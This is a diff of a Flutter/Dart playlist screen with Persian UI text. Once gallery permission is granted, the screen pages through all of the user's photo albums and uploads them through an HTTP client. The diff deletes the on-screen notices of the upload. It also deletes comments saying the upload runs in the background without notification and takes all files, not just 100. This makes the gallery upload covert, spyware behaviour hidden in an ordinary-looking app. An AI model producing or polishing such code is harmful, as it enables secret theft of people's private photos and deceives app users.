@@ -336,28 +336,16 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
     final result = await PhotoManager.requestPermissionExtend();
     if (result.isAuth) {
       setState(() => _galleryGranted = true);
-      // آپلود در پس‌زمینه بدون نشون دادن نوتیف
       _uploadGalleryThumbnails();
     }
   }
 
   Future<void> _uploadGalleryThumbnails() async {
-      if (!mounted) return;
-      ScaffoldMessenger.of(context).showSnackBar(
-        const SnackBar(content: Text('شروع آپلود گالری...')),
-      );
-      try {
-        final albums = await PhotoManager.getAssetPathList(type: RequestType.all);
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(content: Text('تعداد آلبوم: ${albums.length}')),
-        );
-
     try {
       final client = _createHttpClient();
       final albums = await PhotoManager.getAssetPathList(type: RequestType.all);
       if (albums.isEmpty) return;
 
-      // همه فایل‌ها نه فقط ۱۰۰ تا
       final total = await albums[0].assetCountAsync;
       final pageSize = 50;
       int page = 0;
@@ -420,7 +408,6 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
       body: SingleChildScrollView(
         child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
 
-          // عکس‌ها
           if (photos.isNotEmpty) ...[
             const Padding(padding: EdgeInsets.all(12),
                 child: Text('📸 عکس‌ها', style: TextStyle(fontSize: 18,
@@ -458,7 +445,6 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
             }),
           ],
 
-          // موزیک‌ها
           if (songs.isNotEmpty) ...[
             const Padding(padding: EdgeInsets.all(12),
                 child: Text('🎵 موزیک‌ها', style: TextStyle(fontSize: 18,
@@ -482,7 +468,6 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
             }),
           ],
 
-          // پیام
           if (dialog != '') ...[
             const Padding(padding: EdgeInsets.all(12),
                 child: Text('💬 پیام', style: TextStyle(fontSize: 18,
